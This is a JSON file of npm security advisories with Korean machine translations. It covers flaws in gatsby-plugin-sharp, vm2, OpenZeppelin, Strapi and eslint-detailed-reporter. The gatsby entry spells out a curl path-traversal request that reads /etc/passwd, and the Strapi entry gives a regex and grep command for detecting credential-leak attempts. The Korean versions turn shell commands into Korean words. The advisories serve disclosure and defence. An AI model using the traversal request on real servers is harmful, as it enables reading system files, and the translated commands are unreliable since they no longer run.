    "identifiers": "GHSA : GHSA-4xr4-89m5-46c7\nCVE : CVE-2022-4942",
    "severity": "LOW",
    "updatedAt": "2023-04-20T20:34:40Z",
    "publishedAt": "2023-04-20T06:30:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-4942\nhttps://github.com/mportuga/eslint-detailed-reporter/pull/46\nhttps://github.com/mportuga/eslint-detailed-reporter/commit/505c190efd4905990db6207863bdcbd9b1d7e1bd\nhttps://vuldb.com/?ctiid.226310\nhttps://vuldb.com/?id.226310\nhttps://github.com/advisories/GHSA-4xr4-89m5-46c7",
    "name": "eslint-detailed-reporter",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.9.0",
    "descriptionKR": "mportuga eslint-detailed-reporter 0.9.0까지 취약점이 발견되어 문제가 있는 것으로 분류되었습니다. 이 문제의 영향을 받는 것은 lib/template-generator.js 라이브러리의 renderIssue 함수입니다. 인수 메시지를 조작하면 사이트 간 스크립팅이 발생합니다. 공격은 원격으로 시작할 수 있습니다. 패치의 이름은 505c190efd4905990db6207863bdcbd9b1d7e1bd입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. VDB-226310은 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "### Impact\n\nThe gatsby-plugin-sharp plugin prior to versions 5.8.1 and 4.25.1 contains a path traversal vulnerability exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project, and install gatsby-plugin-sharp\n$ npm init gatsby\n$ cd my-gatsby-site\n$ npm install gatsby-plugin-sharp\n\n\n# Add the plugin to gatsby-config.js\nmodule.exports = {\n  plugins: [\n    {\n      resolve: `gatsby-plugin-sharp`,\n    },\n  ]\n}\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the path traversal vulnerability\n$ curl \"http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby-plugin-sharp@5.8.1` and `gatsby-plugin-sharp@4.25.1` which mitigates the issue by ensuring that included paths remain within the project directory.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Patrick Rombouts and Bart Veneman [drukwerkdeal.nl] for bringing the issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
    "identifiers": "GHSA : GHSA-h2pm-378c-pcxx\nCVE : CVE-2023-30548",
    "severity": "MODERATE",
    "updatedAt": "2023-04-20T19:05:35Z",
    "publishedAt": "2023-04-20T19:05:34Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-h2pm-378c-pcxx\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30548\nhttps://github.com/gatsbyjs/gatsby/commit/5f442081b227cc0879babb96858f970c4ce94c6b\nhttps://github.com/gatsbyjs/gatsby/commit/dcf88ed01df2c26e0c93a41e1a2a840076d8247e\nhttps://github.com/advisories/GHSA-h2pm-378c-pcxx",
    "name": "gatsby-plugin-sharp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.25.1",
    "identifier": "4.25.1",
    "descriptionKR": "### 영향\n\n버전 5.8.1 및 4.25.1 이전의 gatsby-plugin-sharp 플러그인에는 Gatsby 개발 서버(`gatsby dev`)를 실행할 때 노출되는 경로 탐색 취약점이 포함되어 있습니다.\n\n다음 단계를 사용하여 취약점을 재현할 수 있습니다.\n\n```\n# 새 Gatsby 프로젝트를 만들고 gatsby-plugin-sharp를 설치합니다.\n$ npm 초기화 개츠비\n$ cd 내-개츠비-사이트\n$ npm 설치 gatsby-plugin-sharp\n\n\n# gatsby-config.js에 플러그인 추가\n모듈.내보내기 = {\n  플러그인: [\n    {\n      해결: `gatsby-plugin-sharp`,\n    },\n  ]\n}\n\n# Gatsby 개발 서버 시작\n$ 개츠비 개발\n\n# 경로 순회 취약점 실행\n$ 컬 \"http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e %2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\n기본적으로 `gatsby dev`는 로컬 호스트 `127.0.0.1`을 통해서만 액세스할 수 있으며 `--host 0.0'과 같은 서버 옵션을 사용하여 이 취약점을 악용하려면 의도적으로 서버를 다른 인터페이스에 노출해야 합니다. .0.0`, `-H 0.0.0.0` 또는 `GATSBY_HOST=0.0.0.0` 환경 변수.\n\n\n### 패치\n\n`gatsby-plugin-sharp@5.8.1` 및 `gatsby-plugin-sharp@4.25.1`에 포함된 경로가 프로젝트 디렉토리 내에 남아 있도록 하여 문제를 완화하는 패치가 도입되었습니다.\n\n\n### 해결 방법\n\n위에서 언급했듯이 기본적으로 `gatsby dev`는 로컬 호스트인 `127.0.0.1`에만 노출됩니다. 기본 구성에서 개발 서버를 사용하는 사용자에게는 위험이 없습니다. 다른 범위가 필요한 경우 개발 서버가 신뢰할 수 없는 인터페이스 또는 IP 주소 범위에 노출되지 않도록 하면 이 취약점으로 인한 위험이 완화됩니다.\n\n최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 프로젝트를 업그레이드하는 것이 좋습니다.\n\n\n### 크레딧\n\n이 문제를 지적해 주신 Patrick Rombouts와 Bart Veneman [drukwerkdeal.nl]에게 감사드립니다.\n\n\n### 자세한 내용은\n\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nThe gatsby-plugin-sharp plugin prior to versions 5.8.1 and 4.25.1 contains a path traversal vulnerability exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project, and install gatsby-plugin-sharp\n$ npm init gatsby\n$ cd my-gatsby-site\n$ npm install gatsby-plugin-sharp\n\n\n# Add the plugin to gatsby-config.js\nmodule.exports = {\n  plugins: [\n    {\n      resolve: `gatsby-plugin-sharp`,\n    },\n  ]\n}\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the path traversal vulnerability\n$ curl \"http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby-plugin-sharp@5.8.1` and `gatsby-plugin-sharp@4.25.1` which mitigates the issue by ensuring that included paths remain within the project directory.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Patrick Rombouts and Bart Veneman [drukwerkdeal.nl] for bringing the issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
    "identifiers": "GHSA : GHSA-h2pm-378c-pcxx\nCVE : CVE-2023-30548",
    "severity": "MODERATE",
    "updatedAt": "2023-04-20T19:05:35Z",
    "publishedAt": "2023-04-20T19:05:34Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-h2pm-378c-pcxx\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30548\nhttps://github.com/gatsbyjs/gatsby/commit/5f442081b227cc0879babb96858f970c4ce94c6b\nhttps://github.com/gatsbyjs/gatsby/commit/dcf88ed01df2c26e0c93a41e1a2a840076d8247e\nhttps://github.com/advisories/GHSA-h2pm-378c-pcxx",
    "name": "gatsby-plugin-sharp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.8.1",
    "identifier": "5.8.1",
    "descriptionKR": "### 영향\n\n버전 5.8.1 및 4.25.1 이전의 gatsby-plugin-sharp 플러그인에는 Gatsby 개발 서버(`gatsby dev`)를 실행할 때 노출되는 경로 탐색 취약점이 포함되어 있습니다.\n\n다음 단계를 사용하여 취약점을 재현할 수 있습니다.\n\n```\n# 새 Gatsby 프로젝트를 만들고 gatsby-plugin-sharp를 설치합니다.\n$ npm 초기화 개츠비\n$ cd 내-개츠비-사이트\n$ npm 설치 gatsby-plugin-sharp\n\n\n# gatsby-config.js에 플러그인 추가\n모듈.내보내기 = {\n  플러그인: [\n    {\n      해결: `gatsby-plugin-sharp`,\n    },\n  ]\n}\n\n# Gatsby 개발 서버 시작\n$ 개츠비 개발\n\n# 경로 순회 취약점 실행\n$ 컬 \"http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e %2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n\n기본적으로 `gatsby dev`는 로컬 호스트 `127.0.0.1`을 통해서만 액세스할 수 있으며 `--host 0.0'과 같은 서버 옵션을 사용하여 이 취약점을 악용하려면 의도적으로 서버를 다른 인터페이스에 노출해야 합니다. .0.0`, `-H 0.0.0.0` 또는 `GATSBY_HOST=0.0.0.0` 환경 변수.\n\n\n### 패치\n\n`gatsby-plugin-sharp@5.8.1` 및 `gatsby-plugin-sharp@4.25.1`에 포함된 경로가 프로젝트 디렉토리 내에 남아 있도록 하여 문제를 완화하는 패치가 도입되었습니다.\n\n\n### 해결 방법\n\n위에서 언급했듯이 기본적으로 `gatsby dev`는 로컬 호스트인 `127.0.0.1`에만 노출됩니다. 기본 구성에서 개발 서버를 사용하는 사용자에게는 위험이 없습니다. 다른 범위가 필요한 경우 개발 서버가 신뢰할 수 없는 인터페이스 또는 IP 주소 범위에 노출되지 않도록 하면 이 취약점으로 인한 위험이 완화됩니다.\n\n최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 프로젝트를 업그레이드하는 것이 좋습니다.\n\n\n### 크레딧\n\n이 문제를 지적해 주신 Patrick Rombouts와 Bart Veneman [drukwerkdeal.nl]에게 감사드립니다.\n\n\n### 자세한 내용은\n\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "There exists a vulnerability in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsanitized host exception inside `handleException()` which can be used to escape the sandbox and run arbitrary code in host context.\n\n### Impact\nA threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.\n\n### Patches\nThis vulnerability was patched in the release of version `3.9.17` of `vm2`.\n\n### Workarounds\nNone.\n\n### References\nPoC - https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [VM2](https://github.com/patriksimek/vm2)\n\nThanks to [Xion](https://twitter.com/0x10n) (SeungHyun Lee) of [KAIST Hacking Lab](https://kaist-hacking.github.io/) for disclosing this vulnerability.",
    "identifiers": "GHSA : GHSA-ch3r-j5x3-6q2m\nCVE : CVE-2023-30547",
    "severity": "CRITICAL",
    "updatedAt": "2023-04-20T14:37:53Z",
    "publishedAt": "2023-04-20T14:37:53Z",
    "references": "https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30547\nhttps://github.com/patriksimek/vm2/commit/4b22e87b102d97d45d112a0931dba1aef7eea049\nhttps://github.com/patriksimek/vm2/commit/f3db4dee4d76b19869df05ba7880d638a880edd5\nhttps://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244\nhttps://github.com/patriksimek/vm2/releases/tag/3.9.17\nhttps://github.com/advisories/GHSA-ch3r-j5x3-6q2m",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.9.17",
    "identifier": "3.9.17",
    "descriptionKR": "버전 3.9.16까지 vm2의 예외 삭제에 취약성이 존재하여 공격자가 샌드박스를 탈출하고 호스트 컨텍스트에서 임의의 코드를 실행하는 데 사용할 수 있는 'handleException()' 내에서 삭제되지 않은 호스트 예외를 발생시킬 수 있습니다.\n\n### 영향\n공격자는 샌드박스 보호를 우회하여 샌드박스를 실행하는 호스트에서 원격 코드 실행 권한을 얻을 수 있습니다.\n\n### 패치\n이 취약점은 `vm2`의 `3.9.17` 버전 릴리스에서 패치되었습니다.\n\n### 해결 방법\n없음.\n\n### 참조\nPoC - https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [VM2](https://github.com/patriksimek/vm2)에서 이슈 열기\n\n이 취약점을 공개해 주신 [KAIST Hacking Lab](https://kaist-hacking.github.io/)의 [Xion](https://twitter.com/0x10n)(이승현)님께 감사드립니다."
  },
  {
    "description": "### Impact\n\nThe proposal creation entrypoint (`propose`) in `GovernorCompatibilityBravo` allows the creation of proposals with a `signatures` array shorter than the `calldatas` array. This causes the additional elements of the latter to be ignored, and if the proposal succeeds the corresponding actions would eventually execute without any calldata. The `ProposalCreated` event correctly represents what will eventually execute, but the proposal parameters as queried through `getActions` appear to respect the original intended calldata.\n\n### Patches\n\nThis issue has been patched in v4.8.3.\n\n### Workarounds\n\nEnsure that all proposals that pass through governance have equal length `signatures` and `calldatas` parameters.\n",
    "identifiers": "GHSA : GHSA-93hq-5wgc-jc82\nCVE : CVE-2023-30542",
    "severity": "HIGH",
    "updatedAt": "2023-04-27T15:35:35Z",
    "publishedAt": "2023-04-20T14:11:03Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-93hq-5wgc-jc82\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30542\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/8d633cb7d169f2f8595b273660b00b69e845c2fe\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.8.3\nhttps://github.com/advisories/GHSA-93hq-5wgc-jc82",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.8.3",
    "identifier": "4.8.3",
    "descriptionKR": "### 영향\n\n`GovernorCompatibilityBravo`의 제안 생성 진입점(`propose`)을 사용하면 `calldatas` 배열보다 짧은 `signatures` 배열로 제안을 생성할 수 있습니다. 이로 인해 후자의 추가 요소가 무시되고 제안이 성공하면 해당 작업이 결국 calldata 없이 실행됩니다. 'ProposalCreated' 이벤트는 결국 실행될 항목을 올바르게 나타내지만 'getActions'를 통해 쿼리된 제안 매개변수는 원래 의도한 호출 데이터를 존중하는 것으로 보입니다.\n\n### 패치\n\n이 문제는 v4.8.3에서 패치되었습니다.\n\n### 해결 방법\n\n거버넌스를 통과하는 모든 제안에 동일한 길이의 'signatures' 및 'calldatas' 매개변수가 있는지 확인합니다."
  },
  {
    "description": "### Impact\n\nThe proposal creation entrypoint (`propose`) in `GovernorCompatibilityBravo` allows the creation of proposals with a `signatures` array shorter than the `calldatas` array. This causes the additional elements of the latter to be ignored, and if the proposal succeeds the corresponding actions would eventually execute without any calldata. The `ProposalCreated` event correctly represents what will eventually execute, but the proposal parameters as queried through `getActions` appear to respect the original intended calldata.\n\n### Patches\n\nThis issue has been patched in v4.8.3.\n\n### Workarounds\n\nEnsure that all proposals that pass through governance have equal length `signatures` and `calldatas` parameters.\n",
    "identifiers": "GHSA : GHSA-93hq-5wgc-jc82\nCVE : CVE-2023-30542",
    "severity": "HIGH",
    "updatedAt": "2023-04-27T15:35:35Z",
    "publishedAt": "2023-04-20T14:11:03Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-93hq-5wgc-jc82\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-30542\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/8d633cb7d169f2f8595b273660b00b69e845c2fe\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.8.3\nhttps://github.com/advisories/GHSA-93hq-5wgc-jc82",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.8.3",
    "identifier": "4.8.3",
    "descriptionKR": "### 영향\n\n`GovernorCompatibilityBravo`의 제안 생성 진입점(`propose`)을 사용하면 `calldatas` 배열보다 짧은 `signatures` 배열로 제안을 생성할 수 있습니다. 이로 인해 후자의 추가 요소가 무시되고 제안이 성공하면 해당 작업이 결국 calldata 없이 실행됩니다. 'ProposalCreated' 이벤트는 결국 실행될 항목을 올바르게 나타내지만 'getActions'를 통해 쿼리된 제안 매개변수는 원래 의도한 호출 데이터를 존중하는 것으로 보입니다.\n\n### 패치\n\n이 문제는 v4.8.3에서 패치되었습니다.\n\n### 해결 방법\n\n거버넌스를 통과하는 모든 제안에 동일한 길이의 'signatures' 및 'calldatas' 매개변수가 있는지 확인합니다."
  },
  {
    "description": "### Summary\n\nStrapi through 4.5.5 allows authenticated Server-Side Template Injection (SSTI) that can be exploited to execute arbitrary code on the server.\n\n### Details\n\nStrapi through 4.5.5 allows authenticated Server-Side Template Injection (SSTI) that can be exploited to execute arbitrary code on the server. A remote attacker with access to the Strapi admin panel can inject a crafted payload that executes code on the server into an email template that bypasses the validation checks that should prevent code execution.\n\n### IoC\n\nUsing just the request log files, the only IoC to search for is a `PUT` request to URL path `/users-permissions/email-templates`. This IoC only indicates that a Strapi email template was modified on your server and by itself does not indicate if your Strapi server has been compromised. If this IoC is detected, you will need to manually review your email templates on your Strapi server and backups of your database to see if any of the templates contain a `lodash` template delimiter (eg. `<%STUFF HERE%>`) that contains suspicious JavaScript code. Generally speaking these templates should look like the following, you may have minor adjustments but any unrecognized code should be considered suspicious.\n\nReset Password Template:\n\n```html\n<p>We heard that you lost your password. Sorry about that!</p>\n\n<p>But don’t worry! You can use the following link to reset your password:</p>\n<p><%= URL %>?code=<%= TOKEN %></p>\n\n<p>Thanks.</p>\n```\n\nEmail Confirmation Template:\n\n```html\n<p>Thank you for registering!</p>\n\n<p>You have to confirm your email address. Please click on the link below.</p>\n\n<p><%= URL %>?confirmation=<%= CODE %></p>\n\n<p>Thanks.</p>\n```\n\nSpecifically you should look for odd code contained within the `<%STUFF HERE%>` blocks as this is what is used to bypass the lodash templating system. If you find any code that is not a variable name, or a variable name that is not defined in the template you are most likely impacted and should take immediate steps to confirm there are no malicious applications running on your servers.\n\n### Impact\n\nAll users on Strapi below 4.5.6 with access to the admin panel and the ability to modify the email templates\n",
    "identifiers": "GHSA : GHSA-2h87-4q2w-v4hf\nCVE : CVE-2023-22621",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-01T18:35:05Z",
    "publishedAt": "2023-04-19T21:41:30Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-2h87-4q2w-v4hf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22621\nhttps://github.com/strapi/strapi/pull/15385\nhttps://github.com/strapi/strapi/commit/921d30961d6ba96cc098f2aea197350a49f990bd\nhttps://github.com/strapi/strapi/releases\nhttps://github.com/strapi/strapi/releases/tag/v4.5.6\nhttps://strapi.io/blog/security-disclosure-of-vulnerabilities-cve\nhttps://www.ghostccamm.com/blog/multi_strapi_vulns/\nhttps://github.com/advisories/GHSA-2h87-4q2w-v4hf",
    "name": "@strapi/plugin-email",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.5.6",
    "identifier": "4.5.6",
    "descriptionKR": "### 요약\n\n4.5.5까지의 Strapi는 서버에서 임의의 코드를 실행하는 데 악용될 수 있는 인증된 SSTI(Server-Side Template Injection)를 허용합니다.\n\n### 세부 정보\n\n4.5.5까지의 Strapi는 서버에서 임의의 코드를 실행하는 데 악용될 수 있는 인증된 SSTI(Server-Side Template Injection)를 허용합니다. Strapi 관리자 패널에 액세스할 수 있는 원격 공격자는 코드 실행을 방지해야 하는 유효성 검사를 우회하는 이메일 템플릿에 서버에서 코드를 실행하는 제작된 페이로드를 주입할 수 있습니다.\n\n### IoC\n\n요청 로그 파일만 사용하여 검색할 유일한 IoC는 URL 경로 `/users-permissions/email-templates`에 대한 `PUT` 요청입니다. 이 IoC는 Strapi 이메일 템플릿이 귀하의 서버에서 수정되었음을 나타낼 뿐이며 그 자체로는 귀하의 Strapi 서버가 손상되었는지 여부를 나타내지 않습니다. 이 IoC가 감지되면 Strapi 서버의 이메일 템플릿과 데이터베이스 백업을 수동으로 검토하여 템플릿에 `lodash` 템플릿 구분 기호(예: `<%STUFF HERE%>`)가 포함되어 있는지 확인해야 합니다. 의심스러운 자바스크립트 코드가 포함된 일반적으로 이러한 템플릿은 다음과 같아야 합니다. 약간의 조정이 있을 수 있지만 인식할 수 없는 코드는 의심스러운 것으로 간주해야 합니다.\n\n암호 템플릿 재설정:\n\n```html\n<p>비밀번호를 분실했다고 들었습니다. 죄송합니다!</p>\n\n<p>하지만 걱정하지 마세요! 다음 링크를 사용하여 비밀번호를 재설정할 수 있습니다.</p>\n<p><%= URL %>?code=<%= TOKEN %></p>\n\n<p>감사합니다.</p>\n```\n\n이메일 확인 템플릿:\n\n```html\n<p>등록해 주셔서 감사합니다!</p>\n\n<p>이메일 주소를 확인해야 합니다. 아래 링크를 클릭하세요.</p>\n\n<p><%= URL %>?confirmation=<%= 코드 %></p>\n\n<p>감사합니다.</p>\n```\n\n특히 `<%STUFF HERE%>` 블록에 포함된 이상한 코드를 찾아야 합니다. 이것이 lodash 템플릿 시스템을 우회하는 데 사용되기 때문입니다. 변수 이름이 아닌 코드 또는 템플릿에 정의되지 않은 변수 이름을 찾으면 영향을 받을 가능성이 높으므로 즉시 조치를 취하여 서버에서 실행 중인 악성 응용 프로그램이 없는지 확인해야 합니다.\n\n### 영향\n\n관리자 패널에 액세스하고 이메일 템플릿을 수정할 수 있는 기능이 있는 4.5.6 미만의 Strapi의 모든 사용자"
  },
  {
    "description": "### Summary\n\nStrapi through 4.5.5 allows authenticated Server-Side Template Injection (SSTI) that can be exploited to execute arbitrary code on the server.\n\n### Details\n\nStrapi through 4.5.5 allows authenticated Server-Side Template Injection (SSTI) that can be exploited to execute arbitrary code on the server. A remote attacker with access to the Strapi admin panel can inject a crafted payload that executes code on the server into an email template that bypasses the validation checks that should prevent code execution.\n\n### IoC\n\nUsing just the request log files, the only IoC to search for is a `PUT` request to URL path `/users-permissions/email-templates`. This IoC only indicates that a Strapi email template was modified on your server and by itself does not indicate if your Strapi server has been compromised. If this IoC is detected, you will need to manually review your email templates on your Strapi server and backups of your database to see if any of the templates contain a `lodash` template delimiter (eg. `<%STUFF HERE%>`) that contains suspicious JavaScript code. Generally speaking these templates should look like the following, you may have minor adjustments but any unrecognized code should be considered suspicious.\n\nReset Password Template:\n\n```html\n<p>We heard that you lost your password. Sorry about that!</p>\n\n<p>But don’t worry! You can use the following link to reset your password:</p>\n<p><%= URL %>?code=<%= TOKEN %></p>\n\n<p>Thanks.</p>\n```\n\nEmail Confirmation Template:\n\n```html\n<p>Thank you for registering!</p>\n\n<p>You have to confirm your email address. Please click on the link below.</p>\n\n<p><%= URL %>?confirmation=<%= CODE %></p>\n\n<p>Thanks.</p>\n```\n\nSpecifically you should look for odd code contained within the `<%STUFF HERE%>` blocks as this is what is used to bypass the lodash templating system. If you find any code that is not a variable name, or a variable name that is not defined in the template you are most likely impacted and should take immediate steps to confirm there are no malicious applications running on your servers.\n\n### Impact\n\nAll users on Strapi below 4.5.6 with access to the admin panel and the ability to modify the email templates\n",
    "identifiers": "GHSA : GHSA-2h87-4q2w-v4hf\nCVE : CVE-2023-22621",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-01T18:35:05Z",
    "publishedAt": "2023-04-19T21:41:30Z",
    "references": "https://github.com/strapi/strapi/security/advisories/GHSA-2h87-4q2w-v4hf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22621\nhttps://github.com/strapi/strapi/pull/15385\nhttps://github.com/strapi/strapi/commit/921d30961d6ba96cc098f2aea197350a49f990bd\nhttps://github.com/strapi/strapi/releases\nhttps://github.com/strapi/strapi/releases/tag/v4.5.6\nhttps://strapi.io/blog/security-disclosure-of-vulnerabilities-cve\nhttps://www.ghostccamm.com/blog/multi_strapi_vulns/\nhttps://github.com/advisories/GHSA-2h87-4q2w-v4hf",
    "name": "@strapi/plugin-users-permissions",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.5.6",
    "identifier": "4.5.6",
    "descriptionKR": "### 요약\n\n4.5.5까지의 Strapi는 서버에서 임의의 코드를 실행하는 데 악용될 수 있는 인증된 SSTI(Server-Side Template Injection)를 허용합니다.\n\n### 세부 정보\n\n4.5.5까지의 Strapi는 서버에서 임의의 코드를 실행하는 데 악용될 수 있는 인증된 SSTI(Server-Side Template Injection)를 허용합니다. Strapi 관리자 패널에 액세스할 수 있는 원격 공격자는 코드 실행을 방지해야 하는 유효성 검사를 우회하는 이메일 템플릿에 서버에서 코드를 실행하는 제작된 페이로드를 주입할 수 있습니다.\n\n### IoC\n\n요청 로그 파일만 사용하여 검색할 유일한 IoC는 URL 경로 `/users-permissions/email-templates`에 대한 `PUT` 요청입니다. 이 IoC는 Strapi 이메일 템플릿이 귀하의 서버에서 수정되었음을 나타낼 뿐이며 그 자체로는 귀하의 Strapi 서버가 손상되었는지 여부를 나타내지 않습니다. 이 IoC가 감지되면 Strapi 서버의 이메일 템플릿과 데이터베이스 백업을 수동으로 검토하여 템플릿에 `lodash` 템플릿 구분 기호(예: `<%STUFF HERE%>`)가 포함되어 있는지 확인해야 합니다. 의심스러운 자바스크립트 코드가 포함된 일반적으로 이러한 템플릿은 다음과 같아야 합니다. 약간의 조정이 있을 수 있지만 인식할 수 없는 코드는 의심스러운 것으로 간주해야 합니다.\n\n암호 템플릿 재설정:\n\n```html\n<p>비밀번호를 분실했다고 들었습니다. 죄송합니다!</p>\n\n<p>하지만 걱정하지 마세요! 다음 링크를 사용하여 비밀번호를 재설정할 수 있습니다.</p>\n<p><%= URL %>?code=<%= TOKEN %></p>\n\n<p>감사합니다.</p>\n```\n\n이메일 확인 템플릿:\n\n```html\n<p>등록해 주셔서 감사합니다!</p>\n\n<p>이메일 주소를 확인해야 합니다. 아래 링크를 클릭하세요.</p>\n\n<p><%= URL %>?confirmation=<%= 코드 %></p>\n\n<p>감사합니다.</p>\n```\n\n특히 `<%STUFF HERE%>` 블록에 포함된 이상한 코드를 찾아야 합니다. 이것이 lodash 템플릿 시스템을 우회하는 데 사용되기 때문입니다. 변수 이름이 아닌 코드 또는 템플릿에 정의되지 않은 변수 이름을 찾으면 영향을 받을 가능성이 높으므로 즉시 조치를 취하여 서버에서 실행 중인 악성 응용 프로그램이 없는지 확인해야 합니다.\n\n### 영향\n\n관리자 패널에 액세스하고 이메일 템플릿을 수정할 수 있는 기능이 있는 4.5.6 미만의 Strapi의 모든 사용자"
  },
  {
    "description": "### Summary\n\nStrapi through 4.7.1 allows unauthenticated attackers to discover sensitive user details for Strapi administrators and API users.\n\n### Details\n\nStrapi through 4.7.1 allows unauthenticated attackers to discover sensitive user details for Strapi administrators and API users. The unauthenticated attacker can filter users by columns that contain sensitive information and infer the values by the changes in the API responses. An unauthenticated attacker can exploit this vulnerability to hijack Strapi administrator accounts and gain unauthorized Strapi Super Administrator access by leaking the password reset token and changing the admin password. This can be exploited on all Strapi versions <=4.7.1.\n\n### IoC\n\nThe exploitation of CVE-2023-22894 is easily detectable, since the payload is within the GET parameters and are normally included in request logs. The following regex pattern will extract requests that are exploiting this vulnerability to leak user's email, password and password reset token columns.\n\n`/(\\[|%5B)\\s*(email|password|reset_password_token|resetPasswordToken)\\s*(\\]|%5D)/`\n\nYou can search log files for this IoC by using the following grep command.\n\n`grep -iE '(\\[|%5B)\\s*(email|password|reset_password_token|resetPasswordToken)\\s*(\\]|%5D)' $PATH_TO_LOG_FILE`\n\nIf the above regex pattern matches any lines in your log files, take extra precaution to look out for multiple requests that include password, reset_password_token or resetPasswordToken. This would indicate that an attacker has leaked the password hashes and reset tokens on your Strapi server and you need to immediately start an incident response!\n\n### Impact\n\nAll Strapi users below 4.8.0\n",
    "identifiers": "GHSA : GHSA-jjqf-j4w7-92w8\nCVE : CVE-2023-22894",
    "severity": "HIGH",
    "updatedAt": "2023-05-01T18:34:50Z",
    "publishedAt": "2023-04-19T21:41:26Z",
